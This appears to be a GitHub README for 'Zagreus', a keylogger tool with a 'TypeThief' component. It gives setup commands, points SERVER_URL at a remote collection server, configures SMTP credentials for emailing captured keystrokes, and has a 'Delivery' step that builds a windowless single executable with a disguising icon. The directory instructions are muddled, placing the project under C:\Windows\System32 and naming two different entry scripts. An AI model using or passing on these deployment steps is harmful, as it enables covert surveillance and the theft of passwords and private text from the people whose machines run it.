![image](https://github.com/user-attachments/assets/bf6142a4-74df-45e8-9103-80462a944c0c)

---

### Quick Setup

1. **Clone the repository:**

   ```bash
   git clone https://github.com/calebpentest/Zagreus.git
   cd Zagreus
   ```

2. **Install dependencies:**

   ```bash
   pip install -r requirements.txt
   ```

---

## Instructions

### Local Testing Configuration

1. **Start the monitoring server:**

   ```bash
   python realtime_server.py
   ```

   * Access the dashboard: `http://127.0.0.1:5000`
   * Server logs: `realtime_server.log`

2. **Configure the keylogger:**

   * Edit `main.py`:

     ```python
     SERVER_URL = "http://your-server-ip:5000"  # Use "http://127.0.0.1:5000" for local
     ```

3. **Run the keylogger:**

   ```bash
   python zagreus.py
   ```

### Directory Structure

When navigating to the project directory, follow these steps:

1. **Navigate to the correct path:**

   ```bash
   cd C:\Windows\System32\Zagreus
   ```

2. **Explore the structure:**

   ```bash
   dir
   ```

   You should see:

   * `Keylogger` directory
   * `requirements.txt` file
   * `TypeThief` directory
   * `Zagreus` directory

3. **Navigate through `TypeThief` and `keylogger`:**

   ```bash
   cd TypeThief
   cd keylogger
   ```

4. **Run the keylogger:**

   ```bash
   python zagreus.py
   ```

---

### Deployment Options

* **Email Configuration:**
  Configure `sendmail.py` with your SMTP credentials:

  ```python
  SMTP_SERVER = "smtp.example.com"
  SMTP_PORT = 587 or 465
  EMAIL_ADDRESS = "your_email@example.com"
  EMAIL_PASSWORD = "your_password"
  ```

* **Delivery (Create Executable):**
  To package the application into a single executable, run:

  ```bash
  pyinstaller -w -F main.py --icon=icon.ico
  ```

---

## Contributing

1. Fork the repository
2. Create a feature branch
3. Submit a pull request

---

## Contact

For security concerns:
Email: [calebepentest@gmail.com](mailto:calebepentest@gmail.com)

---

*Zagreus - Advanced System Monitoring Tool*
*© 2025 St34lthv3ct3r | Ethical Use Only*

---

